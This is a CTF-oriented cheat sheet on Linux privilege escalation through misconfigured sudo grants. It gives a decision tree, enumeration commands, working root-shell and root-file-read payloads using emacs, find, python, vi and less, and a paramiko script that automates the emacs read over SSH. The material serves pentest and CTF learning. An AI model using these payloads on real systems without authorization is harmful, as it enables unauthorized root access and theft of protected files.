# Sudo Abuse (Privilege Escalation)

## Purpose
Escalate from a low-privilege Linux user to root by abusing a misconfigured `sudoers` entry. Any sudo grant to a binary that can read files, write files, or spawn a shell is effectively root access.

## Decision Tree
```
Got a shell / SSH access?
 ├── Run `sudo -l`
 │    ├── Shows NOPASSWD or password-sudo for a binary?
 │    │    ├── Is it a shell/interpreter (python, perl, awk, sh)?
 │    │    │     └── Spawn shell directly -> GTFOBins shell primitive
 │    │    ├── Is it a file reader/editor (emacs, vi, less, more, nano)?
 │    │    │     └── Use non-interactive read: emacs --batch -eval, less/vi in a pager
 │    │    └── Is it something else (find, tar, man, systemctl)?
 │    │          └── Check GTFOBins for that binary's sudo primitive
 │    └── Nothing listed / only deny rules -> pivot to SUID/cron/writable-path checks
 └── `sudo -l` not allowed? -> check `id`, SUID binaries (`find / -perm -4000`), cron jobs
```

## Recon Checklist
- [ ] `sudo -l` — list allowed commands (passwordless = fast win).
- [ ] `id` — current user and groups.
- [ ] Target flag/permission layout: `ls -la` (root-owned `r--r-----` files are common).
- [ ] If sudo is restricted (`NOPASSWD: /path/to/bin`), note the exact path — you may only invoke that binary.

## Reusable Commands
```bash
sudo -l                                   # what can I run as root?
sudo -l 2>/dev/null                       # quiet parse for automation
find / -perm -4000 -type f 2>/dev/null    # SUID fallback if sudo is empty
```

## Common Payloads
```bash
# Emacs batch file read (prints file to stdout)
sudo /bin/emacs --batch -q -eval '(princ (with-temp-buffer (insert-file-contents "/path/to/flag.txt") (buffer-string)))'

# Emacs interactive -> root shell
sudo /bin/emacs
#   then: M-x eshell   or   M-x shell

# Vim/less file read as root (interactive)
sudo vi /path/to/flag.txt
sudo less /path/to/flag.txt            # then :e /path/to/flag.txt if empty pager

# find: command execution
sudo find / -exec /bin/sh \; -quit

# python: interactive shell
sudo python3 -c 'import pty; pty.spawn("/bin/sh")'
```

## Exploitation Workflow
1. Run `sudo -l`; capture the allowed command(s) and any NOPASSWD flag.
2. Look up the binary on GTFobins (https://gtfobins.github.io/) for a `sudo` -> `file read` or `sudo` -> `shell` primitive.
3. Prefer **non-interactive** variants (batch/eval flags) so it works over SSH/automation.
4. If interactive-only, script keystrokes or use the binary's own escape commands.

## Example CTF Scenario
A box grants `(ALL) NOPASSWD: /bin/emacs` to the player. `flag.txt` is root-owned. Running `sudo /bin/emacs --batch -q -eval '(princ (with-temp-buffer (insert-file-contents "flag.txt") (buffer-string)))'` prints the flag.

## Python Automation Example
```python
import paramiko
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('host', port=22, username='ctf-player', password='pw')
cmd = "sudo /bin/emacs --batch -q -eval '(princ (with-temp-buffer (insert-file-contents \"/home/ctf-player/flag.txt\") (buffer-string)))'"
stdin, stdout, stderr = c.exec_command(cmd)
print(stdout.read().decode())
c.close()
```

## Common Mistakes
- Forgetting `sudo -l` exists as the first enumeration step.
- Assuming an "editor" sudo grant is harmless — editors/interpreter grants are root-equivalent.
- Trying to type into an interactive emacs over a plain `ssh ... command` invocation (no TTY) — use `--batch -eval` instead.
- Not honoring `secure_path`/`env_reset`: rely on absolute paths given by `sudo -l`.

## CTF Tips
- Hint text like "What is sudo? How do you know what permission you have?" directly points at `sudo -l`.
- On Windows hosts where `sshpass` is unavailable, automate SSH with `paramiko` (`pip install paramiko`) and feed the password programmatically.
- Batch flags that disable init/user config make emacs output cleaner: `-q` (no user config), `--batch` (no interactive UI).

## References
- GTFOBins: https://gtfobins.github.io/
- PayloadsAllTheThings - Linux Privilege Escalation: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
